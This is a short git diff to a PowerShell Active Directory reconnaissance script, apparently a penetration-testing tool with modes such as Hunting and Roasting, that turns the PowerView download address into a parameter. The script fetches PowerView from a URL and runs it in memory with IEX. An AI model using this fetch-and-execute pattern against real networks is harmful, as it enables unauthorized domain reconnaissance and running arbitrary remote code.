@@ -71,7 +71,11 @@ Param(
 	[Parameter(Position = 1)]
 	[ValidateSet('DCOnly', 'Hunting', 'Roasting', 'LargeEnv', 'Special')]
     [String]
-    $Mode = 'DCOnly'
+    $Mode = 'DCOnly',
+
+	[Parameter(Position = 2)]
+    [String]
+    $url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
 )
 	
 	
@@ -81,11 +85,10 @@ Write-Host "runas /netonly /user:DOMAIN\USERNAME powershell.exe"
 #Start Stopwatch
 $stopwatch = [system.diagnostics.stopwatch]::startnew()
 
-#Download PowerView From GitHub. This is bad and there will be a URL parameter added to the command.
+#Download PowerView from specified URL or from GitHub.
 try {
 	$webclient = New-Object System.Net.WebClient
 	$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-	$url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
 	Write-Host "Downloading Powerview:" -ForegroundColor Cyan
 	Write-Host "$url | " -NoNewLine
 	IEX $webclient.DownloadString($url)
